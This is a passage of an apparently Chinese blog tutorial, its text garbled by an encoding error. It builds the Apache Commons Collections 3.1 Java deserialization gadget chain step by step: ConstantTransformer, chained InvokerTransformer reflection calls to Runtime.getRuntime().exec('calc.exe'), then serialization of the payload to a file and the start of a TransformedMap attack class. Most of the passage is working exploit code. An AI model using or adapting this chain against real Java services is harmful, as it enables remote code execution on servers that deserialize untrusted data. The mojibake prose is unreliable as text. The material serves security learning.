fin.readObject;a_in.transform(input);}</p><p>æˆ‘ä»¬ä¼šå‘ç°å¦‚æœæˆ‘ä»¬è¦ç›´æ¥åˆ©ç”¨è¿™ä¸ªåå°„æœºåˆ¶ä½œä¸ºæ¼æ´çš„è¯ï¼Œéœ€è¦æœåŠ¡ç«¯çš„å¼€å‘äººå‘˜ï¼š</p><ol start=1><li>å¸®æˆ‘ä»¬å†™ä¸€ä¸ªpayloadä½œä¸ºinputï¼›</li><li>æ¥å—å®¢æˆ·ç«¯è¾“å…¥å‚æ•°ï¼Œååºåˆ—åŒ–æˆInvokerTransformerç±»</li><li>å†åˆ»æ„è°ƒç”¨InvokerTransformerç±»çš„transformå‡½æ•°</li></ol><p>å®é™…ä¸Šâ€¦..åªæœ‰å¼€å‘äººå‘˜æ˜¯è‡ªå·±äººçš„æƒ…å†µä¸‹æ‰æ»¡è¶³æ¡ä»¶å§â€¦â€¦æ‰€ä»¥æˆ‘ä»¬é¢ä¸´ä¸€äº›é—®é¢˜ï¼š</p><ol start=1><li>payloadè‚¯å®šéœ€è¦åœ¨å®¢æˆ·ç«¯å¯ä»¥è‡ªå®šä¹‰æ„é€ ï¼Œå†ä¼ è¾“è¿›å…¥æœåŠ¡ç«¯</li><li>æœåŠ¡ç«¯éœ€è¦æŠŠæˆ‘ä»¬çš„è¾“å…¥expååºåˆ—åŒ–æˆä¸€ä¸ªåœ¨ä»£ç ä¸­å¯èƒ½ä½¿ç”¨åˆ°çš„ç±»</li><li>å¹¶ä¸”åœ¨ä»£ç æ­£å¸¸æ“ä½œä¸­ä¼šè°ƒç”¨è¿™ä¸ªç±»ä¸­çš„ä¸€ä¸ªå¯è§¦å‘æ¼æ´åœ°å‡½æ•°ï¼ˆå½“ç„¶è¿™ä¸ªå‡½æ•°æœ€åä¼šè¿›å…¥æˆ‘ä»¬InvokerTransformerç±»çš„transformå‡½æ•°ï¼Œä»è€Œå½¢æˆå‘½ä»¤æ‰§è¡Œï¼‰</li><li>å¦‚æœè¿™ä¸ªååºåˆ—åŒ–çš„ç±»å’Œè¿™ä¸ªç±»è§¦å‘å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å¯ä»¥åœ¨ä¸€ä¸ªreadObjectå¤å†™å‡½æ•°ä¸­æ°å¥½è§¦å‘ï¼Œå°±å¯¹äºæœåŠ¡ç«¯ä¸Šä¸‹æ–‡è¯­å¥æ²¡æœ‰è¦æ±‚äº†ï¼</li></ol><p>è¿™è¾¹å‡å¦‚åƒé¢„æœŸè¿™æ ·ï¼Œæ˜¯å¯¹æœåŠ¡ç«¯ä¸Šä¸‹æ–‡æ²¡æœ‰è¦æ±‚ï¼Œå› ä¸ºåªè¦æ‰§è¡ŒreadObjectå°±è‚¯å®šä¼šå‘½ä»¤æ‰§è¡Œï¼Œä¸éœ€è¦å…¶ä»–ä¸Šä¸‹æ–‡æ¡ä»¶ã€‚</p><p>ä½†æ˜¯å¯¹äºæœåŠ¡ç«¯ç‰ˆæœ¬ç¯å¢ƒæ˜¯æœ‰è¦æ±‚çš„ï¼Œä¹‹åä¼šè¯´åˆ°</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¸€ä¸ªä¸ªæ¥è§£å†³é—®é¢˜ï¼šé¦–å…ˆä½¿å®¢æˆ·ç«¯è‡ªå®šä¹‰paylaodï¼</p><p><strong>ç¬¬äºŒæ­¥ ChainedTransformer</strong></p><p>ä¸‹é¢æˆ‘ä»¬éœ€è¦å…³æ³¨ChainedTransformerè¿™ä¸ªç±»,é¦–å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªç±»çš„æè¿°ï¼š</p><p>/*** Transformer implementation that chains the specified transformers together.* &lt;p>* The input object is passed to the first transformer. The transformed result* is passed to the second transformer and so on.*å°†æŒ‡å®šçš„è½¬æ¢å™¨è¿æ¥åœ¨ä¸€èµ·çš„è½¬åŒ–å™¨å®ç°ã€‚è¾“å…¥çš„å¯¹è±¡å°†è¢«ä¼ é€’åˆ°ç¬¬ä¸€ä¸ªè½¬åŒ–å™¨ï¼Œè½¬æ¢ç»“æœå°†ä¼šè¾“å…¥åˆ°ç¬¬äºŒä¸ªè½¬åŒ–å™¨ï¼Œå¹¶ä»¥æ­¤ç±»æ¨</p><p>å¯ä»¥çŸ¥é“ä»–ä¼šæŠŠæˆ‘ä»¬çš„Transformerå˜æˆä¸€ä¸ªä¸²ï¼Œå†é€ä¸€æ‰§è¡Œï¼Œå…¶ä¸­è¿™ä¸ªæ“ä½œå¯¹åº”çš„å°±æ˜¯ChainedTransformerç±»çš„transformå‡½æ•°</p><p>/*** Transforms the input to result via each decorated transformer** @param object the input object passed to the first transformer* @return the transformed result*/public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) {object = iTransformers[i].transform(object);} return object;}</p><p>è¿™é‡Œä¼šéå†iTransformersæ•°ç»„ï¼Œä¾æ¬¡è°ƒç”¨è¿™ä¸ªæ•°ç»„ä¸­æ¯ä¸€ä¸ªTransformerçš„transformï¼Œå¹¶ä¸²è¡Œä¼ é€’æ‰§è¡Œç»“æœã€‚</p><p>é¦–å…ˆç¡®å®šiTransformerså¯æ§ï¼ŒiTransformersæ•°ç»„æ˜¯é€šè¿‡ChainedTransformerç±»çš„æ„é€ å‡½æ•°èµ‹å€¼çš„ï¼š</p><p>/*** Constructor that performs no validation.* Use &lt;code>getInstance&lt;/code> if you want that.** @param transformers the transformers to chain, not copied, no nulls*/public ChainedTransformer(Transformer transformers) { super;//è¿™ä¸ªsuperä¸æ¸…æ¥šåšäº†å•¥ï¼ŒiTransformers = transformers;}</p><p>é‚£ä¹ˆæˆ‘ä»¬çŸ¥é“å¯ä»¥è‡ªå®šä¹‰iTransformersçš„å†…å®¹ï¼Œæˆ‘ä»¬å·²æœ‰æ¡ä»¶å¦‚ä¸‹ï¼š</p><p>//æœ€ç»ˆæ‰§è¡Œç›®æ ‡Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//æ­¤å¤„åœ¨è·å–å®ä¾‹, "calc.exe") //InvokeTransformerå…³é”®è¯­å¥ï¼špublic Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>å†çœ‹åˆ°InvokeTransformerä»£ç æˆ‘ä»¬éœ€è¦å¼•å‡ºä¸€ä¸ªæ³¨æ„ç‚¹ï¼š</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°input.getClassè¿™ä¸ªæ–¹æ³•ä½¿ç”¨ä¸Šçš„ä¸€äº›åŒºåˆ«ï¼š</p><ul><li>å½“inputæ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹å¯¹è±¡æ—¶ï¼Œè·å–åˆ°çš„æ˜¯è¿™ä¸ªç±»</li><li>å½“inputæ˜¯ä¸€ä¸ªç±»æ—¶ï¼Œè·å–åˆ°çš„æ˜¯java.lang.Class</li></ul><p>å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç éªŒè¯ï¼Œè¿™é‡Œä¸å†èµ˜è¿°</p><p>Object a = Runtime.getRuntime;Class b = Runtime.class;System.out.println(a.getClass);System.out.println(b.getClass); //ç»“æœ//class java.lang.Runtime//class java.lang.Class</p><p>åŸºäºä¹‹å‰å†™çš„ä»£ç ï¼š</p><p>//åªè°ƒç”¨InvokeTransformerçš„æƒ…å†µå¦‚ä¸‹ï¼šInvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“inputçš„ä¸ºRuntimeç±»çš„å¯¹è±¡ï¼Œæ‰€ä»¥clså°±æ˜¯Runtimeç±»ï¼Œæ‰€ä»¥cls.getMethodå¯ä»¥æ‰¾åˆ°execæ–¹æ³•ï¼Œç›´æ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>å…ˆæŠŠaå°è£…æˆChainedTransformeræ ¼å¼ï¼Œä½†æ˜¯payloadè¿˜æ˜¯åœ¨å¤–é¢</p><p>//å®¢æˆ·ç«¯æ„é€ payloadTransformer transformers = new Transformer { new InvokerTransformer("exec",new Class{String.class},new String{"calc.exe"});}Transformer transformerChain = new ChainedTransformer(transformers); //æœåŠ¡ç«¯è§¦å‘æ‰€éœ€å†…å®¹Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));transformerChain.transform(input);//æ­¤å¤„å¿…é¡»ä¸ºinputï¼Œä½œä¸ºç¬¬ä¸€ä¸ªè¾“å…¥</p><p>æŠŠpayloadæ”¾å…¥Transformeræ•°ç»„ä¸­ï¼Œéœ€è¦è½¬åŒ–æˆç‰¹å®šçš„Transformeræ ¼å¼æ‰è¡Œã€‚</p><p><strong>ç¬¬äºŒç‚¹äº”æ­¥ ConstantTransformer -> Runtimeå®ä¾‹åºåˆ—åŒ–</strong></p><p>æˆ‘ä»¬æ‰¾åˆ°ConstantTransformerç±»è·ŸInvokkerTransformerä¸€æ ·ç»§æ‰¿Transformeçˆ¶ç±»ï¼Œå¯ä»¥è¿›å…¥æ•°ç»„é¡¾åæ€ä¹‰ConstantTransformerç±»å…¶å®å°±åªä¼šå­˜æ”¾ä¸€ä¸ªå¸¸é‡ï¼›å®ƒçš„æ„é€ å‡½æ•°ä¼šå†™å…¥è¿™ä¸ªå˜é‡ï¼Œä»–çš„transformå‡½æ•°ä¼šè¿”å›è¿™ä¸ªå˜é‡ã€‚æŠŠRuntimeå®ä¾‹å†™å…¥è¿™ä¸ªå˜é‡ï¼š</p><p>Transformer transformers = new Transformer { //ä»¥ä¸‹ä¸¤ä¸ªè¯­å¥ç­‰åŒ,ä¸€ä¸ªæ˜¯é€šè¿‡åå°„æœºåˆ¶å¾—åˆ°ï¼Œä¸€ä¸ªæ˜¯ç›´æ¥è°ƒç”¨å¾—åˆ°Runtimeå®ä¾‹// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),new ConstantTransformer(Runtime.getRuntime), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);//æ­¤å¤„è¾“å…¥å¯ä»¥ä¸ºä»»æ„å€¼ï¼Œå› ä¸ºä¸ä¼šè¢«ä½¿ç”¨åˆ°ï¼Œç›¸å½“äºåˆå§‹ç¬¬ä¸€ä¸ªè¾“å…¥ä¸ºæˆ‘ä»¬è®¾ç½®çš„å¸¸é‡</p><p>ä»¥ä¸Šä»£ç å¯ä»¥æˆåŠŸå¼¹æ¡†æ‰§è¡Œï¼é‚£ä¹ˆæˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸‹åºåˆ—åŒ–ä¸ååºåˆ—åŒ–è¿‡ç¨‹ï¼</p><p>//å®¢æˆ·ç«¯æ„é€ payloadTransformer transformers = new Transformer { new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers); //payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); //æœåŠ¡ç«¯ååºåˆ—åŒ–payloadè¯»å–FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //æœåŠ¡ç«¯ååºåˆ—åŒ–æˆChainedTransformeræ ¼å¼ï¼Œå¹¶åœ¨æœåŠ¡ç«¯è‡ªä¸»ä¼ å…¥æ¶æ„å‚æ•°inputTransformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);</p><p>ä½†æ˜¯å¾ˆé—æ†¾çš„å‘Šè¯‰ä»¥ä¸ºå¿«è¦æˆåŠŸçš„ä½ ï¼ŒæˆåŠŸçš„æœ¬åœ°æµ‹è¯•åŠ ä¸Šåºåˆ—åŒ–ã€ååºåˆ—åŒ–è¿‡ç¨‹ä¹‹åå°±ä¼šå¤±è´¥ã€‚å› ä¸ºRuntimeç±»çš„å®šä¹‰æ²¡æœ‰ç»§æ‰¿Serializableç±»ï¼Œæ‰€ä»¥æ˜¯ä¸æ”¯æŒååºåˆ—åŒ–çš„ã€‚</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a692eb7772c1477f83a9626dd41407bf><p class=pgc-img-caption></p></div><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨payloadå†™å…¥Runtimeå®ä¾‹çš„è®¡åˆ’å°±æ³¡æ±¤äº†ã€‚</p><p><strong>ç¬¬äºŒç‚¹å…«æ­¥ åœ¨æœåŠ¡ç«¯ç”ŸæˆRuntimeå®ä¾‹</strong></p><p>æ—¢ç„¶æˆ‘ä»¬æ²¡æ³•åœ¨å®¢æˆ·ç«¯åºåˆ—åŒ–å†™å…¥Runtimeçš„å®ä¾‹ï¼Œé‚£å°±è®©æœåŠ¡ç«¯æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ç”Ÿæˆä¸€ä¸ªRuntimeå®ä¾‹å‘—ï¼Ÿæˆ‘ä»¬çŸ¥é“Runtimeçš„å®ä¾‹æ˜¯é€šè¿‡Runtime.getRuntimeæ¥è·å–çš„ï¼Œè€ŒInvokerTransformeré‡Œé¢çš„åå°„æœºåˆ¶å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ã€‚åŒæ—¶ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸæ‰§è¡Œè¿‡Runtimeç±»é‡Œé¢çš„execå‡½æ•°ã€‚è®²é“ç†è‚¯å®šæ˜¯æ²¡é—®é¢˜çš„.</p><p>æˆ‘ä»¬å…ˆçœ‹getRuntiimeæ–¹æ³•çš„å‚æ•°</p><p>public static Runtime getRuntime { return currentRuntime;}</p><p>æ²¡æœ‰å‚æ•°ï¼Œé‚£å°±éå¸¸ç®€å•äº†</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class),//å¾—åˆ°Runtime class//ç”±äºInvokerTransformerçš„æ„é€ å‡½æ•°è¦æ±‚ä¼ å…¥Classç±»å‹çš„å‚æ•°ç±»å‹ï¼Œå’ŒObjectç±»å‹çš„å‚æ•°æ•°å€¼ï¼Œæ‰€ä»¥å°è£…ä¸€ä¸‹ï¼Œä¸‹é¢ä¹Ÿä¸€æ ·//ä¸Šé¢ä¼ å…¥Runtime.classï¼Œè°ƒç”¨Runtime classçš„getRuntimeæ–¹æ³•ï¼ˆç”±äºæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œinvokeè°ƒç”¨é™æ€æ–¹æ³•ï¼Œä¼ å…¥ç±»å³å¯ï¼‰new InvokerTransformer("getRuntime",new Class{},new Object{}), //ä¸Šé¢Runtime.getRuntimeå¾—åˆ°äº†å®ä¾‹ï¼Œä½œä¸ºè¿™è¾¹çš„è¾“å…¥(invokeè°ƒç”¨æ™®é€šæ–¹æ³•ï¼Œéœ€è¦ä¼ å…¥ç±»çš„å®ä¾‹)new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);</p><p>åœ¨è¿™é‡Œï¼Œä¹‹å‰è‡ªå·±é™·å…¥äº†ä¸€ä¸ªå¾ˆå‚»é€¼çš„é—®é¢˜ï¼Œå³ï¼šInvokerTransformerç±»transformæ–¹æ³•ä¸­return method.invokeè¿™ä¸ªè¯­å¥invokeè°ƒç”¨åˆ°åº•returnäº†å•¥?å› ä¸ºåœ¨è¿™é‡Œå½¢æˆäº†ä¸€ä¸ªè°ƒç”¨returnçš„ç»“æœï¼Œå†è°ƒç”¨çš„é“¾ã€‚ä¸ºä»€ä¹ˆå°±å¯ä»¥ä¸Šä¸€ä¸ªè¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªè¾“å…¥æ—¶ï¼Œå¯ä»¥æˆåŠŸè°ƒç”¨äº†å‘¢ï¼Ÿä¸€å¼€å§‹ä»¥ä¸ºinvokeä¼šç»Ÿä¸€è¿”å›ä¸€ä¸ªå¯¹è±¡ä½œä¸ºä¸‹ä¸€ä¸ªè¾“å…¥ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•çš„æ—¶å€™æ¯æ¬¡invokeçš„ç»“æœéƒ½ä¸ä¸€æ ·ï¼Œæºç çœ‹çš„å¤´æ™•ã€‚å®é™…ä¸Šæ˜¯é’»äº†æ­»èƒ¡åŒï¼šinvokeçš„returnæ˜¯æ ¹æ®è¢«è°ƒç”¨çš„å‡½æ•°returnå•¥ï¼Œinvokeå°±returnå•¥ã€‚å°±å¥½æ¯”æˆ‘invokeä¸€ä¸ªæˆ‘è‡ªå®šä¹‰çš„æ–¹æ³•aï¼Œåœ¨aä¸­ï¼Œæˆ‘returnäº†å­—ç¬¦ä¸²"1"ã€‚é‚£ä¹ˆå°±æ˜¯invokeçš„ç»“æœå°±æ˜¯å­—ç¬¦ä¸²"1"ã€‚çœ‹ä»¥ä¸Šçš„è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡Runtime.getRuntimeçš„ç»“æœè¾“å…¥äº†ä¸‹ä¸€ä¸ªInvokerTransformer</p><p>ä»¥ä¸Šæ„Ÿè§‰æ˜¯ä¸‡äº‹å¤§å‰äº†ï¼ä½†æ˜¯å®é™…ä¸Šå¹¶ä¸æ˜¯â€¦</p><p>å›æƒ³ä¹‹å‰å¯¹äºInvokerTransformerä¸­Class cls = input.getClass;çš„è§£é‡Š</p><ul><li>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°input.getClassè¿™ä¸ªæ–¹æ³•ä½¿ç”¨ä¸Šçš„ä¸€äº›åŒºåˆ«ï¼š</li><li>å½“inputæ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹å¯¹è±¡æ—¶ï¼Œè·å–åˆ°çš„æ˜¯è¿™ä¸ªç±»</li></ul><p>å½“inputæ˜¯ä¸€ä¸ªç±»æ—¶ï¼Œè·å–åˆ°çš„æ˜¯java.lang.Class</p><p>æˆ‘ä»¬æ¥æ¨æ¼”ç¬¬ä¸€æ¬¡InvokerTransformerçš„åå°„è°ƒç”¨ï¼Œå³å¾—åˆ°Runtimeç±»å¯¹è±¡çš„getRuntimeæ–¹æ³•è°ƒç”¨:</p><p>//InvokeTransformerå…³é”®è¯­å¥ï¼špublic Object transform(Object input) {//inputä¸ºæˆ‘ä»¬è®¾ç½®çš„å¸¸é‡Runtime.classClass cls = input.getClass;//ï¼ï¼ï¼è¿™é‡Œç”±äºinputæ˜¯ä¸€ä¸ªç±»ï¼Œä¼šå¾—åˆ°java.lang.Class//åœ¨java.lang.Classç±»ä¸­å»å¯»æ‰¾getRuntimeæ–¹æ³•ä¼å›¾å¾—åˆ°Runtimeç±»å¯¹è±¡ï¼Œæ­¤å¤„æŠ¥é”™ï¼ï¼Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>é‚£ä¹ˆæˆ‘ä»¬å¥½åƒé™·å…¥äº†ä¸€ä¸ªæ­»èƒ¡åŒï¼šå¾—åˆ°Runtimeç±»å®ä¾‹æ‰èƒ½è°ƒç”¨execæ–¹æ³•ã€‚è€Œå¾—åˆ°Runtimeç±»å®ä¾‹ä½œä¸ºinputï¼Œæ‰èƒ½å¾—åˆ°Runtime classï¼Œæ‰èƒ½æ‰¾åˆ°getRuntimeæ–¹æ³•ï¼Œå¾—åˆ°Runtimeç±»å®ä¾‹â€¦â€¦â€¦</p><p>â€¦â€¦â€¦â€¦â€¦â€¦â€¦éå¸¸çš„å°´å°¬â€¦â€¦â€¦â€¦â€¦â€¦â€¦..</p><p><strong>ç¬¬äºŒç‚¹ä¹æ­¥ è¿˜æ˜¯åå°„æœºåˆ¶</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ç›´æ¥è°ƒç”¨Runtime.getRuntimeæ–¹æ³•å¥½åƒæ˜¯è¡Œä¸é€šäº†,æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å‘¢ï¼Ÿ</p><p><strong>è¿˜æ˜¯åå°„æœºåˆ¶</strong></p><p>å·²çŸ¥ï¼š</p><ol start=1><li>æˆ‘ä»¬å¼€å¤´ä¸èƒ½è·å¾—Class.forName("java.lang.Runtime")ï¼Œåªèƒ½å¾—åˆ°Class.forName("java.lang.Class")</li><li>æˆ‘ä»¬å¯ä»¥æœ‰ä»»æ„çš„åå°„æœºåˆ¶æ±‚ï¼š</li><li>æˆ‘ä»¬è¦è·å–åˆ°Runtime.getRunimeå‡½æ•°ï¼Œå¹¶æ‰§è¡Œå®ƒã€‚è§£ï¼š</li><li>é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„getMethodç±»ï¼Œç”±äºgetMethodç±»æ˜¯å­˜åœ¨Classç±»ä¸­ï¼Œå°±ç¬¦åˆå¼€å¤´Classç±»çš„é™åˆ¶</li><li>é€šè¿‡getMethodå‡½æ•°è·å–Runtimeç±»ä¸­çš„getRuntimeå‡½æ•°</li><li>åœ¨å“ªä¸ªç±»ä¸­è°ƒç”¨getMethodå»è·å–æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯ç”±invokeå‡½æ•°é‡Œé¢çš„çš„ç¬¬ä¸€ä¸ªå‚æ•°objå†³å®šçš„</li><li>å†é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„invokeç±»ï¼Œæ‰§è¡Œä¸Šé¢è·å–çš„getRuntimeå‡½æ•°</li><li>invokeè°ƒç”¨getRuntimeå‡½æ•°ï¼Œè·å–Runtimeç±»çš„å®ä¾‹è¿™é‡Œåœ¨ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨getRuntimeé™æ€ç±»æ—¶ï¼Œinvokeé‡Œé¢ç¬¬ä¸€ä¸ªå‚æ•°objå…¶å®å¯ä»¥ä»»æ„æ”¹ä¸ºnullï¼Œæˆ–è€…å…¶ä»–ç±»ï¼Œè€Œä¸ä¸€å®šè¦æ˜¯Runtimeç±»</li></ol><p>å…·ä½“å˜åŒ–ç»†èŠ‚ï¼Œæˆ‘é€‰æ‹©æŠŠå®ƒæ”¾åœ¨åå°„æœºåˆ¶ä¸€æ–‡ä¸­è¯´æ˜ï¼Œè¿™è¾¹ç»™å‡ºç»“æœã€‚</p><p>æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡ŒClass.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")</p><p>å…ˆæ¥è·å–getRuntimeç±»</p><p>//ç›®æ ‡è¯­å¥Class.forName("java.lang.Runtime").getMethod("getRuntime")//ä½¿ç”¨java.lang.Classå¼€å¤´Class.forName("java.lang.Class").getMethod("getMethod", new Class {String.class, Class.class }).invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]); //invokeå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Runtimeç±»ï¼Œæˆ‘ä»¬éœ€è¦åœ¨Runtimeç±»ä¸­å»æ‰§è¡ŒgetMethodï¼Œè·å–getRuntimeå‚æ•°</p><p>å¯¹ç…§ç€InvokerTransformerç±»è½¬å˜ä¸ºtransformersæ ¼å¼</p><p>Class cls = input.getClass;//cls = java.lang.ClassMethod method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethodæ–¹æ³•return method.invoke(input, this.iArgs); //åœ¨Runtimeä¸­æ‰¾getRuntimeæ–¹æ³•ï¼Œå¹¶è¿”å›è¿™ä¸ªæ–¹æ³•</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), //è¿˜éœ€è¦å¡«å…… è°ƒç”¨getRuntimeå¾—åˆ°Runtimeå®ä¾‹,new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>è¿˜å·®æ‰§è¡Œè·å–åˆ°çš„getRuntimeï¼Œä¸‹ä¸€ä¸ªinputæ˜¯ä¸Šä¸€ä¸ªæ‰§è¡Œæ¥å£ï¼Œç»§ç»­å¯¹ç…§</p><p>//input=getRuntimeè¿™ä¸ªæ–¹æ³•Class cls = input.getClass;//cls = java.lang.Methodï¼ˆgetRuntimeæ–¹æ³•æ˜¯methodç±»ï¼‰Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //åœ¨methodç±»ä¸­æ‰¾åˆ°invokeæ–¹æ³•ï¼Œmethod=invokeæ–¹æ³•return method.invoke(input, this.iArgs); //è°ƒç”¨invokeæ–¹æ³•ï¼Œinput=getRuntimeè¿™ä¸ªæ–¹æ³•ï¼Œä¼ å…¥è‡ªå®šä¹‰çš„å‚æ•°</p><p>ä»¥ä¸Šæœ€åä¸€æ­¥æœ‰ç‚¹å¤æ‚ï¼Œmethodå°±æ˜¯invokeæ–¹æ³•ï¼Œç›¸å½“äºä½¿ç”¨invokeè°ƒç”¨äº†invokeå‡½æ•°ã€‚é¦–å…ˆthis.iMethodName, this.iParamTypesæ˜¯æ ¹æ®invokeæ¥å£è€Œå®šçš„ï¼š</p><p>public Object invoke(Object obj, Object... args)//this.iMethodName="invoke"//this.iParamTypes=new Class {Object.class, Object.class }//å¤–é¢classã€Objectå°è£…æ˜¯InvokerTransformerç±»çš„æ„é€ å‡½æ•°è¦æ±‚</p><p>æŒ‰ç…§invokeä¸­çš„inputæ‰æ˜¯å®ƒè¦è°ƒç”¨çš„ç¯å¢ƒçš„å‡†åˆ™ã€‚invokeæ–¹æ³•.invoke(input, this.iArgs)å®é™…ä¸Šç­‰äºinput.invoke(this.iArgs)ï¼Œè€Œinput=getRuntimeæ–¹æ³•ï¼Œé‚£ä¹ˆåªè¦å¡«å…¥this.iArgså°±å¥½äº†</p><p>åˆç”±äºgetRuntimeæ˜¯ä¸ªé™æ€å‡½æ•°ï¼Œä¸ç”¨å¤ªçº ç»“è¾“å…¥objï¼Œå†™ä½œnullã€‚getRuntimeæ–¹æ³•ä¸éœ€è¦å‚æ•°ã€‚this.iArgs=null,new Object[0]</p><p>é‚£ä¹ˆæ•´åˆå°±å¦‚ä¸‹ï¼š</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>ä»¥ä¸Šä»£ç å…¶å®å°±æ˜¯ç­‰åŒäº((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec("calc.exe");æˆ‘ä»¬ç¬¼ç»Ÿçš„æ¥ç†è§£ï¼Œå®é™…å°±æ˜¯å¦‚ä¸‹ï¼ˆè¿™é‡Œå·ä¸€å¼ orlevençš„å›¾ï¼‰ï¼š</p><div class=pgc-img><img alt="JAVAååºåˆ—åŒ– - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/399744f6d7d94c5bb840de05422a8d70><p class=pgc-img-caption></p></div><p>æ€»ä½“ä¸Šæ¥è¯´ï¼šåˆ©ç”¨äº†åå°„æœºåˆ¶è°ƒç”¨åå°„æœºåˆ¶çš„å‡½æ•°ï¼Œç»•è¿‡äº†å¼€å¤´clsåªèƒ½ä¸ºjava.lang.Classçš„é™åˆ¶ï¼Œæ ¹æ®å…·ä½“ç¯å¢ƒinputç¯ç¯ç›¸æ‰£ï¼Œç‰¹ä¹ˆç«Ÿç„¶æ°å¥½å°±é€šäº†â€¦.éå¸¸çš„å¾®å¦™â€¦.</p><p><strong>ç¬¬ä¸‰æ­¥ TransformedMap</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨ç¬¬äºŒæ­¥é€šè¿‡ConstantTransformerã€ChainedTransformerå°±å®Œæˆäº†payloadåœ¨å®¢æˆ·ç«¯è‡ªå®šä¹‰è¿™ä¸€ç›®æ ‡ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ç›®å‰çš„æ”»å‡»æµç¨‹</p><p>public class commons_collections_3_1 { public static void main(String args) throws Exception { //1.å®¢æˆ·ç«¯æ„å»ºæ”»å‡»ä»£ç //æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»Transformer transformerChain = new ChainedTransformer(transformers); //payloadåºåˆ—åŒ–å†™å…¥æ–‡ä»¶ï¼Œæ¨¡æ‹Ÿç½‘ç»œä¼ è¾“FileOutputStream f = new 